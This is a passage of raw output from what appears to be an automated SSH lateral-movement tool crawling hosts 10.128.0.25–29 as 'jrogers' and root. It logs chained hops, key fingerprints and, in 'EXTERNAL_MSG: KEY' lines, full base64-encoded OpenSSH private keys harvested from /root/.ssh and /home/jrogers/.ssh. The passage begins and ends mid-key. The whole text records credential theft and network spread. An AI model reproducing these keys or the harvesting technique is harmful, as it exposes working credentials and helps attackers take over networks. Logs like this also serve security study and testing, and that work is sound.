IwbXBUeld5blcwSzBEaEFBQUEKd1FDaHcwZXMvRkdrUndsbEFYTmlPd201eHNnQWhLQUFkcHRYU3VLWWRvQlNQYklleVBGNnQ3VlVzclI0MmlmMHF0NDdmTApzMVVFeU1qRnNQcEVRMEFTbHlPUEk0U1h3NHlWaUhaTVluZ2pWOExIZ3FkOXY3a2o4cEJlNXMvNCtiZnpCUVpWbDJHQkNvCk5zdVI0cVZlMGZDbGlQd3pjMDcwOERGdnJoa2dNQXpPSWYwOWptdzkxd2dESmxuUWN1REVtZGdVSjBZY3NWMXZ2emp4NDcKbThWcFlhQzN3clBlc3FqMWdjK2RjdWJKSjlqN01ycmxnZlZsclliMTFTTi9weFAxTUFBQURCQU9CekJnWmhva0kyRzRGcwpGUXhjaVFOZUlERkFkZTJEMDdTTzRidG5vVEJSRmhKZ2VNVUFyQ2RkZGQ0NzFpZ0FSMWtCdU8rb3Nid2lXeEZtbCtPMEF3CmN5TlNtaWZGaGlMWG1VVmpnNytPdHRlSmFlaVE4OWtQT0FYQlErSzUyWXB0TERuM05IYmN6NHQ4SjRiUG4zRVkzeUZFcnQKYUVxb29HWExyNVBxRkNqQU0zemIwcVdqZmNTT3JFTjRKK0Z3cCt6blZXZU90MHoyMzJ4T2dmTDhKNUk1anZqSTlFUEU0Vgp6UDdNbUNTRklaWDNwMm9ZWTgxeEkwRyt2cWpwUXNHUUFBQU1FQTJKUDgvWmxmK0ZYbldKQ3FiUWtlbXlBa3UycE5UT1pWCnF2U3ZaZ3lTdUtmRW9pZ29zRlRCbzBITURKVEEzb3pSOVF5blJHR1BXRHprQXRwZit3N3RrQ3ZrdWtob2VOZ3FjSldBSGwKVE51dUlEQTlZaEVSYVFHTTRSVlhQQUZWWlhzOStTVzgxS2ZYWGQxQktQcnpDNXVqS1JrbFhheUsrbWE1VWl0TVpZMUhFKwpFSzBKbjM4enZiQ1BqbUYrNkE2Zm1GZkdLby9NdDVjYXFFc3U2NWVjQ05qTFhPRTlOdEJ0cm9yWGo1S0RoRWFQb1VkZ3JkCmNoSDI1L1gyVGZWMlIzQUFBQUVtcHliMmRsY25OQWFXNXpkR0Z1WTJVdE53PT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020298]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29: Discovered usable private key [3072 MD5:88:56:95:eb:90:b5:8a:1c:00:65:3f:da:75:9c:1d:71 root@instance-7 (RSA)] in [/root/.ssh/id_rsa]\n[1704020298]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29: EXTERNAL_MSG: KEY[/root/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF2bUlXTjZjc3c4RzhDQXFHcmhiUmhJbEF1YzRSQUQrbFRRUUR5aWVPazB4eUY3c3pNR1c4ClFpU3RTU1BqaW1wKzhub1ZmL3RuUG4wTWp5MEJtSCtyU3kyYThKeDZCSzE0cG0vT2MxbUtWNEFwRmpvZ1BFNDBXbmNtL3EKTjU3UzM1eUNxQ3o3Vkw0Y0xOMHNqN3N3ME9KR3p5NlNxVW9zckY5QnVxL0t4bjRCeUlzRGErRm0vSVdpRDZiczczTGhMRAp4UFpXNDd0N2xmYWczNTNCTWNBTXJ4U0pkM2lxS3UwamNYa29vdUwzUzNUSlNJUHBneDBnelBaSkNhSDVBOTd0Z1dIbERDClp6ZVlFNFdGVU9KQ0VzcXlwVnRRSDZkN2ZWcGgxaHVCd1Z5VzRTVXpxUStSNjVHWWRFYmFVdks5V1dueHlUc0ZMcERYMGEKcjNmbTUzUkpqRm5pM1h3eW8zUS85ODhxT2Z3cUVLODJDKzE0a0Z2UGdYUE5CQTJZQzhJdndVR1RSUFlrRkhVdnlvQmdpbApISzJRa1ZCUFA4SnVaZ01kNWFXcmFWV2lWdHBmempvMWhMa3NCT0lwemx5cXJmQVBnZVJINmRSeExEdEtLTU5JZVFTWnRECi9XbDFueDg0bFJtQnBuS29RVEtidnQ0dnNpMGpFQ0NrV1BzcTFkejNBQUFGaUNoOTViTW9mZVd6QUFBQUIzTnphQzF5YzIKRUFBQUdCQUw1aUZqZW5MTVBCdkFnS2hxNFcwWVNKUUxuT0VRQS9wVTBFQThvbmpwTk1jaGU3TXpCbHZFSWtyVWtqNDRwcQpmdko2RlgvN1p6NTlESTh0QVpoL3Ewc3RtdkNjZWdTdGVLWnZ6bk5aaWxlQUtSWTZJRHhPTkZwM0p2NmplZTB0K2NncWdzCisxUytIQ3pkTEkrN01ORGlSczh1a3FsS0xLeGZRYnF2eXNaK0FjaUxBMnZoWnZ5Rm9nK203Tzl5NFN3OFQyVnVPN2U1WDIKb04rZHdUSEFESzhVaVhkNHFpcnRJM0Y1S0tMaTkwdDB5VWlENllNZElNejJTUW1oK1FQZTdZRmg1UXdtYzNtQk9GaFZEaQpRaExLc3FWYlVCK25lMzFhWWRZYmdjRmNsdUVsTTZrUGtldVJtSFJHMmxMeXZWbHA4Y2s3QlM2UTE5R3E5MzV1ZDBTWXhaCjR0MThNcU4wUC9mUEtqbjhLaEN2Tmd2dGVKQmJ6NEZ6elFRTm1BdkNMOEZCazBUMkpCUjFMOHFBWUlwUnl0a0pGUVR6L0MKYm1ZREhlV2xxMmxWb2xiYVg4NDZOWVM1TEFUaUtjNWNxcTN3RDRIa1IrblVjU3c3U2lqRFNIa0VtYlEvMXBkWjhmT0pVWgpnYVp5cUVFeW03N2VMN0l0SXhBZ3BGajdLdFhjOXdBQUFBTUJBQUVBQUFHQkFLak1tUHhSS2h5SzJtZWF4WnozT0Y4MXZvCkMvbDAxTUlRanZCVmtveDM0TWFxQmw1MVlDN2U4TFMrVXNmK1BLMXJHdzB2MDliMlgxUTd4eVlCYlJJNVF0WkZIdnV6UUkKaG8relZDM3I5di9yN3dINUdYbStzU2FBdkw5TFBLQ3hnZVVhNUE2N3BRTVBVS1NTZExCbFkrT2lBYUlBa2ZiZ3FMRHVFeQpXaXl4cm0wYjdEV3JqVDlhVUwxbCtHKzV3TElTNnlaNG5WUWhkTnE0ZDQvTUZha1NSdXBnK2FtZTRqZ2Focmp6OFUwOFJBClVQTU5tbTRZMW10RDlyQW12MzNTR2VUbTV1Skozdm9Ya3plVHVqUW9NYkh3SHg1TVpqQkJwcW9VR3ZLL3RUUjdjT3VYMzIKd1VwdXQzTFNvZWNMV1ZhN21pTkFHY1JUcnB2aEhYTXhPMExXVHdYa0h2Q0VTemVlSUlTOVBaaDQ1bUY2Wms5ZThhZzVlNQpHSXgzZFljSFZEaW81d1VSam12M21RWDRrVHBoOGQ5WVhzZS9sdHhsZlFWVDY5bW9MYmszUDZJR01OQU9aMWhRb2FmVlN1CllNdGE4V1JQY2d1RkFlT3dtUGFTOXc0VGVLSXpjTG12VHJDZDY2dU5rTXRNWjZORWloOXBTZ2lEMUJDU3Z5T0R6MTZRQUEKQU1FQXZLcnVUY0FlenFPUjNZMXhHZTBiR29xRFU4QUhUTjBtYWVMa1RSaHZqalc0MElndXkvQ2hleTRSNnd0a1FQN3pSSQoyQzAyemJMTkh3cU5lOGJDRjdFNWVyRFJuZStsaHB1bm9CQUxnZ3Yya0ZvNnhhanVpcW1VVlJTaHVjSlR1bnhmK251b21jCnVsQ2VNL0dOZUlLbkFwdEdFL3MvaU5RN3ZUdnA3NW9BemNRWVo3NVJETWt5OUlxZ1NQb1pLd3dsbFpHYkd0K21TaS9UUi8KZHVuZkVrcGs3TVpRU3h2c0RTSjFJbnpZOHFxMUtQV1BtbW03czNZbS9Id1NxUUxicUdBQUFBd1FEcFdCZUJ2WTZtYVovOQpycXZ3Y1RNakxqSnJBZEZWR2ZQWmtBQy9BVDJwOTBBNEZJZTNCcDhGU1dWTFU2cG1aNzdrSjVJSUZCdGxXZjJnNmNFcmExCjYrYVREaUt5N1NsZWxNNTdaQVFyS1BPUEtDcHdTcXZGcTVaNjEwcjhzWkg5STE1c29BYkhQM1hLb0pPS09WUTFtVDZ5bXEKOTQzZUg2QU9KZGxsNlI2Qldwc2o3aFUvbURvMW03YmZWdkd4R2xIU1ZmdTArZUtEUTBsczU5YW5BQnEzbWFBbTNYQmUrTwowMy9xMTQ0UUxkR2grbFlwV2hsOHRrbG51Vll1QjhhVjBBQUFEQkFORGVMSzRmaG03d3JiUUtoNTJGMy9YSzR2eU5HSVRBCjdmQVZ3R3dscVF3clBFQm9mLzIycHlnaUFlWGFOK2ZNRG5ZdU56TTRoOGNZakgyK2grRkVGL3JKV2c1M2RCVU5QUnFLK28KNEJINGlnaTNZQ3pXSnlWYTVJemtPakxCWURLbVBsbm5MK09GU0NtaVYxUXM5MlRPMG0vRk4xcXVra0cvSVMwdEM4MlV0SwpqbkdYR2NCNjBWd002Um15ZlA3ZldSWUlSWFRGNTYrT0l2VFg5SUt0Zlk5ME52MnJpTU1GR0I5VzA3aUhyVU5iYzdHNmNwCndFalFUcnJVQlVyUVcyWXdBQUFBOXliMjkwUUdsdWMzUmhibU5sTFRjQkFnPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020298]   jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29: EXTERNAL_MSG: INFO: Beginning with 12 dests and 2 keys\n[1704020299]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.25\n[1704020299]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.25)\n[1704020299]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.27\n[1704020299]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.27)\n[1704020299]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.26\n[1704020299]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.26)\n[1704020300]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.29\n[1704020300]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020300]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@10.128.0.28\n[1704020300]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.28)\n[1704020301]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/root/.ssh/id_rsa]->root@127.0.0.1\n[1704020301]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/root/.ssh/id_rsa]->root@(10.128.0.29)\n[1704020301]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.25\n[1704020301]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.25)\n[1704020301]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27\n[1704020301]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)\n[1704020302]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26\n[1704020302]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)\n[1704020302]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29\n[1704020302]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)\n[1704020302]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28\n[1704020302]    jrogers@(10.128.0.25)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.27)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.26)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.29)[!/home/jrogers/.ssh/id_rsa]->jrogers@(10.128.0.28)\n[1704020303]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28: Discovered usable private key [3072 MD5:b6:30:3a:99:e8:36:fe:81:33:0c:b2:82:6a:44:9a:55 jrogers@instance-6 (RSA)] in [/home/jrogers/.ssh/id_rsa]\n[1704020303]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28: EXTERNAL_MSG: KEY[/home/jrogers/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF3OU5sODBtQ04za1VuNVBRazhoY3hFY0xVQjJ1R0IvZVVHSTNxVnlPeEVwN3VKNC9uTlVxCjRmYmlDQlQ2SlExUFExRUtCM1JHNEtqSHpobnJreDcxR1J4YW45ZHBVN3QwRkZxbVVnajE1dVBqVy9Yd1hmMlJkUHFETVgKQm1STUdid3lnRUpibUpvblN2aGFBUjk5TTRONkZnTGJGb2hJYkJZcERRZkRublhpUDFxcHpVa1crMklaVTFaNFN4YWplNApXak1FREtCL0Z0b3gxbVVNQXlHUUx6WVovL1BORWtnY21ZakZYL0JVZUZqSkhHYzRTb0lsbThBVFpYcHYzZEVqNEt0VktGCkFEdHUySUlSbFlmcEJJeElmVjFybnJQSUtUdG1yME52NHlkSWhpTWFuVzNsalZ3c05oOFlwUGRGd1krWEN5QVdLd2ovaGkKbDVRTzlQQm93SmE1a0ttV0x5V2FYanc3Z3FacXVKbVNhWWVnYldsV0w3ejdrQ0ZNbUdkZlpwWkgrVXlXejhhZldjZlhkRQo3V1RPSUc3Qm9iTnZGczhPNVBmMllIRkhrZXhhNkVqS2pSOE9Jc0xJZGU0WnJmSVZGOVdYekdhUi9Xd0FFams3VWdhSGVuCmRmMllkWGFOWEQzT1hvL3AyQjk5M2Z1dFY1V0IzVkZuQWhLaGo0Zi9BQUFGaUJSbUJIa1VaZ1I1QUFBQUIzTnphQzF5YzIKRUFBQUdCQU1QVFpmTkpnamQ1RkorVDBKUElYTVJIQzFBZHJoZ2YzbEJpTjZsY2pzUktlN2llUDV6Vkt1SDI0Z2dVK2lVTgpUME5SQ2dkMFJ1Q294ODRaNjVNZTlSa2NXcC9YYVZPN2RCUmFwbElJOWViajQxdjE4RjM5a1hUNmd6Rndaa1RCbThNb0JDClc1aWFKMHI0V2dFZmZUT0RlaFlDMnhhSVNHd1dLUTBIdzU1MTRqOWFxYzFKRnZ0aUdWTldlRXNXbzN1Rm96QkF5Z2Z4YmEKTWRabERBTWhrQzgyR2YvenpSSklISm1JeFYvd1ZIaFl5UnhuT0VxQ0padkFFMlY2YjkzUkkrQ3JWU2hRQTdidGlDRVpXSAo2UVNNU0gxZGE1Nnp5Q2s3WnE5RGIrTW5TSVlqR3AxdDVZMWNMRFlmR0tUM1JjR1Bsd3NnRmlzSS80WXBlVUR2VHdhTUNXCnVaQ3BsaThsbWw0OE80S21hcmlaa21tSG9HMXBWaSs4KzVBaFRKaG5YMmFXUi9sTWxzL0duMW5IMTNSTzFremlCdXdhR3oKYnhiUER1VDM5bUJ4UjVIc1d1aEl5bzBmRGlMQ3lIWHVHYTN5RlJmVmw4eG1rZjFzQUJJNU8xSUdoM3AzWDltSFYyalZ3OQp6bDZQNmRnZmZkMzdyVmVWZ2QxUlp3SVNvWStIL3dBQUFBTUJBQUVBQUFHQUJyTDZyK0g1NUcvdDlxK1YyUmhucEFkU0tjCkY2TFRVWjQrSVlTV0R6T1YvYTc2dnFQVEZGc0VsRDNrYnBiODhPd1J6S25RcXJTaEE4Rlo3cFlqVVM2WE1BM3FyOTNYRnkKUFNnRXZKVzE0OW96OHZkczY2bzdDYWR3U1lhdzJQVk9vTlNEbjg3REdKMnBTNGI0Vm1RUmJrWEZCb3NsS2pONTlpZENHcAozWWZtMzRmNGV4OWUrK2FWT3phZ0V1R0pZalptS01adW91cnRkMEVRT1A3Nk44VFVFcWpva0dvUE42bHY0STBvbGtPbUcvCkw0dVFiMndZWVVXbTVEZldEOTZScmtlMG1BeklJczJkMmI4OWhuekdSVGxvaWZ2VlEwTUdxcy90NzB0NWQwUjFSZGpZL1QKalZLejFMQk5sUXU1REwwSy9zdHpGWkxySXM0NjhZVEs2R21HcWNzQ0F6eG1TMFp4amREYmx6b0dWejZIRURDQW9mWlBYcApqcUYwZXZOWS8yTDZjVzdpWEJPZFNyZ0R4dWdmWG5ZOVlPZXc1NXZ0L3U2a1h0V2tOUHh3VXc2OWljZHBBUzFZOUxUMVJZCjVhcWpONEd0UUNoQW1DeVNMejBxQWFUL2hsV01VdVlnMFVrZmFjTm9EU0xSWlVMSE5sQnRhSVNpWXUwSDZtVFdUaEFBQUEKd0QxR3kwU24xMGhNcjQvaFdxWjRoVFhNS2pUaTR2VmtsR1Z4QmxXdndhQjhhTE5pU25NRGgrZTI4N21VWXpkYStZeks1MAprL2JoakJOLzk2c25KTHN5SVQ1NVpiWDczYVJZdUR4ZHZyTXgzbEZJdGppMldScWFScGE1dWJ6V2VZYnFlU251YU5SMVpMCk5yZENOQkxjdGZ0UC9IZ3AveXQ0R1RpNW0ydGFhU0JnRFpsa3NDakN4ZTUyNVFQcGhGREp2eWRjQi9hWHZIVGhrdGQ0aFQKc1NGWDRUUm8xS2gxZDBCY3hrVGxzN3d4QUN2OVFMTHlyaEpyUDB1SWRsekl4cmhnQUFBTUVBOE42R2ZDUERuWnF6cUhYcwoyN082RmVKVEV6OWR2N0VOQlFYeHQ5US9UbHcvNnNXdTIwcmw4TXJhV1lwMXBmZ1RKdFVleU9DRnNkZTlpaDNhdktQRU1oCjJJTnkvbm51bEdjUHZJR0pUajlFSEYxYzJYdHBVNHVJbGQzVmIrUGZORzdvdUlSQUFpT1hjQ1FkYUQwNzQ4ZTd1SkJRNDQKVkhqNTBKUWRkV3d2WVU5QkxMMGNQSEVkMmFaTnJ4V0hkRFdYWW9QaThOd3dCZjRVNUt0WG45b0hsYzFXSjVKVWpzV21WWgpaajJob04yQzRNYnBOdGt1ZURWVURJTTN4Z3ZWK25BQUFBd1FEUUlJUzFtM0d6dW04bUVyZnhLRW54bUVyaUNaakg2eHlGClFHSzZZT1pHbS9qb1ZWVERscTh2RjQ3aW95NXVFc3RyYWxEZDF0bFYzWTFSaEYxYUFPaEdLK0RoUUpueFBMR1VnQ1h1UEUKNG1NSHcwS2Y2THc0Skh4OFIxZU9GZ0xxMkNVajlSbEMrOUl1ejc3c0lOUjMzanNWdUVSUC8zblFpYjA0bkt0MzgvL2hrSAp6dHNmZDQ2U1NLUjZmRmxQU3ppY0UzTGQvci94Mjhobno2S3FqdkdKRE5KdDM1bmE0STl4S3JVUkJFaDhIZzhsN0JPcXNqClJaTWhTUk41NDMzK2tBQUFBU2FuSnZaMlZ5YzBCcGJuTjBZVzVqWlMwMkFRPT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==\n[1704020303]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28: Discovered usable private key [3072 MD5:fa:24:e5:39:6e:ca:01:bd:9d:ba:4f:dc:39:32:a1:8c root@instance-6 (RSA)] in [/root/.ssh/id_rsa]\n[1704020303]    jrogers@10.128.0.25[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.27[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.26[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.29[!/home/jrogers/.ssh/id_rsa]->jrogers@10.128.0.28: EXTERNAL_MSG: KEY[/root/.ssh/id_rsa]: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF4dllUdE81WGEvUDN4S0ZPRTFTY3JhbmhFZHhZTzFIbUE1bnNpNVdIbHBOSURhWU5WZDIvCndOWEw1QXB4Sm5sYjFBUitObUtGa1RPN3ZyUmZaVkZ0UW1TejVEMkl0K3dUanc0SUpQdjBVdEVzUHd6VzNSTlhZRGFrZkgKRDd1T1RXZGt2VlMyVEtnL2w1TCttRDZjMjkxaUNQaVZPUVV0UENjWEJPQ1dBNURKelpIWEh5VVpvcUsvSlkvSS9KR0lINgpDMUhrQzVxaTFISERiVXlYbjd5dzMxU3QvL0Mra3VVdHYxM0lHTU5WUlNST09HYXp2VnZlTFlnK0k2c0d2dlFWRjNUKzBTCnJYaC9JZWg1Vkw0eVNvWUhOVTYvbHBNbFZiV1VoaXhLUURJaTFTdkNwMUlJNXJEd01ickszeWxyb3U3bEV5a2IrUjR0alIKcjVHd1NIMkJ1TVNtMzlEM1U5WVhTVEtNZW1tOERsQjhsazkxL0lXWXBwckxvMjlINkM2N3NweEFuRHRwbHZtWFh0YUU4dwpYSFpKaVBwTlRuL2JWQ25USXlmY3hLK0hwQURZQStQRUxZNzB1RE1aSWtLSmVPaGY0SzhPNkRSaGxvTmFCQmVId1JORzJ4Cmw4QkY2WWppNU5WUUpjS0dMZlpOYjVDUEpDZkVnS0hQd01Bb0ZNNmpBQUFGaUxyK2N0YTYvbkxXQUFBQUIzTnphQzF5YzIKRUFBQUdCQU1iMkU3VHVWMnZ6OThTaFRoTlVuSzJwNFJIY1dEdFI1Z09aN0l1Vmg1YVRTQTJtRFZYZHY4RFZ5K1FLY1NaNQpXOVFFZmpaaWhaRXp1NzYwWDJWUmJVSmtzK1E5aUxmc0U0OE9DQ1Q3OUZMUkxEOE0xdDBUVjJBMnBIeHcrN2prMW5aTDFVCnRreW9QNWVTL3BnK25OdmRZZ2o0bFRrRkxUd25Gd1RnbGdPUXljMlIxeDhsR2FLaXZ5V1B5UHlSaUIrZ3RSNUF1YW90UngKdzIxTWw1KzhzTjlVcmYvd3ZwTGxMYjlkeUJqRFZVVWtUamhtczcxYjNpMklQaU9yQnI3MEZSZDAvdEVxMTRmeUhvZVZTKwpNa3FHQnpWT3Y1YVRKVlcxbElZc1NrQXlJdFVyd3FkU0NPYXc4REc2eXQ4cGE2THU1Uk1wRy9rZUxZMGErUnNFaDlnYmpFCnB0L1E5MVBXRjBreWpIcHB2QTVRZkpaUGRmeUZtS2FheTZOdlIrZ3V1N0tjUUp3N2FaYjVsMTdXaFBNRngyU1lqNlRVNS8KMjFRcDB5TW4zTVN2aDZRQTJBUGp4QzJPOUxnekdTSkNpWGpvWCtDdkR1ZzBZWmFEV2dRWGg4RVRSdHNaZkFSZW1JNHVUVgpVQ1hDaGkzMlRXK1FqeVFueElDaHo4REFLQlRPb3dBQUFBTUJBQUVBQUFHQkFKbEdTYmhCUlNmdE14dFFDUTNyU1NpZ2pyCnRydkswMlVyVERoKytncW12ZDJzeG8rQzBHUUFzV3FaUnNWdThFM3pGZXBMelErWVQ3RGMvRXRSa2d1Y05FUVRHOEZlOWEKOTFabHdQQjlDYVFqY0tyQ0FXVWUyVmxOdnpuKzhHMW9IYS9VaStVaEtNS3pGaUZMREV5NksxMGlpSEdLNXN4b1JvdU5zUgpDWUNGc25HandNNUZqcEkwUG4xNVg2VHptS0tFOUFMeWFoWW4rM2hJNVhTeGZNRFpaL2JleVdVcnBudys2QkdQMjZ2WjRlCmNnUVJXcmF1WjJNOGFtS2dCdnBrbmQ0ZWZTc1lGLzRlZjlmU1dpVFl2eFNWSVROWEN0ZWUxc0JHZGpNMXEraGRCZ21QZHcKY2R5VlJUbExEL212a1RMYm5FRmEvVnJ2Z3lUQTZqUTlzSjJaSHM4Rjg1Y3o0c2pIZTExbzNwVm5MUXRqU3ZueWZNbzc2ZApFMmc2ZHdXRkVPRW1oRi8yOWFhdWl2MWdGZEU0S1lkVm1keTMvd2I5aWdFSmZyVENKZjdHMHNJYUx6SlM0TDZGQTRSNmdrCm1JOFBlWWhDUkZaN0ZxWUl1ODUzTEhyQ256TkhrdG5MeHJUY2RZKy9MenF1endYR3VQU0RKRy9lW